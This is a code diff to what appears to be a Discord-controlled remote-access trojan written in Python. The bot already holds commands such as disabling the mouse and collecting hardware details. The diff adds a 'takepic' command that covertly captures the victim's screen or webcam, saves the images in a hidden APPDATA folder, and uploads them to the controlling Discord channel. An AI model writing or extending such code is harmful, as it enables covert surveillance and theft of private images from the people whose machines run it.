@@ -1,4 +1,7 @@
 import ctypes,threading,os;import winreg as reg;import queue;import subprocess,webbrowser,asyncio,platform,sys,psutil,cpuinfo,GPUtil,socket,discord
+import pygame.camera,pyautogui,random,string
+ctypes.windll.kernel32.GetModuleHandleW.restype = ctypes.c_void_p
+ctypes.windll.kernel32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
 async def nomouse(ctx, action):
  try:
   if action == "start":
@@ -171,3 +174,32 @@ async def detailed_hardware_info(ctx):
   await ctx.send(embed=embed)
  except Exception as e:
   await ctx.send(f"Error retrieving hardware information: {str(e)}")
+pygame.camera.init()
+
+async def takepic(ctx, args):
+    folder = os.path.join(os.getenv('APPDATA'), 'Roaming', 'media', 'screenshots')
+    if not os.path.exists(folder):
+        os.makedirs(folder)
+    
+    def random_name():
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".png"
+    
+    if args == "ss":
+        filename = random_name()
+        path = os.path.join(folder, filename)
+        pyautogui.screenshot(path).save(path)
+        await ctx.send(file=discord.File(path))
+    
+    elif args == "cam":
+        cameras = pygame.camera.list_cameras()
+        if not cameras:
+            await ctx.send("theres no cams so theres no pic :(")
+            return
+        cam = pygame.camera.Camera(cameras[0])
+        cam.start()
+        image = cam.get_image()
+        filename = random_name()
+        path = os.path.join(folder, filename)
+        pygame.image.save(image, path)
+        await ctx.send("webcam image:", file=discord.File(path))
+        cam.stop()
